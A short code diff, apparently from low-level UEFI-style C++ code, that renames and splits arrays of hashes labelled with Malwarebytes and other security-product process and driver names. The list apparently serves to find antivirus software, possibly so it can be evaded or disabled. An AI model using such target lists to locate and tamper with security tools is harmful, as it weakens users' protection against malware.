@@ -31,11 +31,13 @@ namespace globals {
 	extern UINTN global_sys_caller;
 
 	// AV_Hashes to be added to defensive iterations list
-	inline constexpr UINT64 AV_Hashes[] = {
+	inline constexpr UINT64 AV_PROCESS_THREADS[] = {
 		0x553d6130527311f4,		// MBAMService.exe
 		0xc248d15e1873240b,		// MalwareBytes.exe
 		0x43db3ecc6f37bf1b,		// MBAMService.exe
+	};
 
+	inline constexpr UINT64 DRIVER_HASHES[]{
 		// Pretty sure all these hashes below are wrong, maybe not though, check hashing --> Yeah they are wrong..
 		0xc4df760c384b44ba,		// MBAMProtection.sys
 		0x1673d042eabcfd05,		// ESProtectionDriver.sys
